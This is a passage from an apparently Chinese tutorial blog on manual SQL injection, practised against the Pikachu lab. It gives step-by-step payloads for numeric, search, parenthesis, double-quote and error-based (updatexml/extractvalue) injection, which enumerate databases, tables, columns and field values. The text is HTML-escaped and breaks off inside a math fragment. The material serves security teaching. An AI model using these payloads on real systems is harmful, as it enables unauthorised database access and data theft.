C1everF0x 就被闭合掉，中间的 or 1=1 就是 sql 注入攻击语句&lt;br&gt;
 (1) 利用 1’ order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询查看显示位&lt;br&gt;
 1’ union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 1’ union select 1,group_concat (schema_name) from (information_schema.schemata)#   所有数据库&lt;br&gt;
或&lt;br&gt;
 1’ union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名  columns_priv&lt;br&gt;
1’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 1’union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 1’ union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 1’ union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 1’ union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 1’ union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;搜索型注入&#34;&gt; 搜索型注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
当在搜索框搜索的时候，称为搜索型。搜索型与数字型注入最大的区别在于：数字型不需要百分号闭合，而搜索类型一般要使用百分号来闭合。&lt;br&gt;
搜索型：select * from user where password like ‘%$pwd%’;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
使用 keywords% &#39;and 1=1 and ‘%’=&#39; 和 keywords% ‘and 1=2 and ‘%’=’&lt;br&gt;
select username from user where username like ‘%keyword% ‘and 1=1 and ‘%’=’%’   (true)&lt;br&gt;
select username from user where username like ‘%keyword% ‘and 1=2 and ‘%’=’%’  (false)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;x%’ or 1 = 1 #&lt;br&gt;
(1) 利用 1’ order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x%’ union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x%’ union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x%’ union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x%’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x%’ union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x%’ union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x%’ union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x%’ union select 1,group_concat (concat_ws (‘分隔符’, 表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x%’ union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;p&gt;所有数据库&lt;/p&gt;
&lt;p&gt;information_schema,mysql,performance_schema,pikachu,sys&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pikachu&lt;/p&gt;
&lt;p&gt;表：httpinfo,member,message,users,xssblind&lt;/p&gt;
&lt;p&gt;httpinfo&lt;/p&gt;
&lt;p&gt;列：id,userid,ipaddress,useragent,httpaccept,remoteport&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;userid&lt;/th&gt;
&lt;th&gt;ipaddress&lt;/th&gt;
&lt;th&gt;useragent&lt;/th&gt;
&lt;th&gt;httpaccept&lt;/th&gt;
&lt;th&gt;remoteport&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;span id=&#34;xx型注入&#34;&gt; （xx）型注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
这种情况很少见，是程序员不规则操作造成的，一般不会单独归为一类。&lt;br&gt;
xx 型：select * from users where username = (’$name’)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xx’) or 1=1#&lt;/p&gt;
&lt;p&gt;(1) 利用 x’) order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x’) union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x’) union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x’) union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x’) union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x’) union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x’) union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x’) union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x’) union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x’) union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;双引号注入&#34;&gt; 双引号注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;双引号型：select * from users where username = (&amp;quot;$name&amp;quot;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xx&amp;quot;) or 1=1#&lt;/p&gt;
&lt;p&gt;(1) 利用 x&amp;quot;) order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x&amp;quot;) union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x&amp;quot;) union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;基于报错注入&#34;&gt; 基于报错注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;部分网站不直接引用数据库查询结果并将其显示在页面上，而是仅仅只返回查询成功与否的状态，那么在这种情况下，就很难利用联合查询的方式来进行注入。&lt;/p&gt;
&lt;p&gt;为了解决这一难题，我们引入了报错注入这一新的攻击方式。其思路就是，虽然网站不将数据查询结果直接返回到前端，但是如果我们人为地引发数据库的错误，那么数据库会将报错信息返回给前端。如果我们可以构造恰当的报错语句，使得数据库返回给我们的报错信息夹带上我们所需要查询的数据，就可以顺利的通过报错的方式来完成注入。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 mysql 高版本（大于 5.1 版本）中添加了对 XML 文档进行查询和修改的函数：&lt;br&gt;
updatexml（）&lt;br&gt;
extractvalue（）&lt;br&gt;
当这两个函数在执行时，如果出现 xml 文档路径错误就会产生报错&lt;/li&gt;
&lt;li&gt;updatexml（）函数&lt;br&gt;
 updatexml（）是一个使用不同的 xml 标记匹配和替换 xml 块的函数。&lt;br&gt;
作用：改变文档中符合条件的节点的值&lt;br&gt;
语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是 string 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：代表路径，Xpath 格式的字符串例如 //title【@lang】 第三个参数：string 格式，替换查找到的符合条件的数据&lt;br&gt;
 updatexml 使用时，当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;br&gt;
例如： select * from test where ide = 1 and (updatexml (1,0x7e,3)); 由于 0x7e 是～，不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;/li&gt;
&lt;li&gt;extractvalue（）函数&lt;br&gt;
此函数从目标 XML 中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string 格式，为 XML 文档对象的名称 第二个参数：xpath_string（xpath 格式的字符串） select * from test where id=1 and (extractvalue (1,concat (0x7e,(select user ()),0x7e)));&lt;br&gt;
extractvalue 使用时当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;br&gt;
select user,password from users where user_id=1 and (extractvalue(1,0x7e));&lt;br&gt;
 由于 0x7e 就是～不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;/li&gt;
&lt;li&gt;SQL 语句：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo mathvariant=&#34;no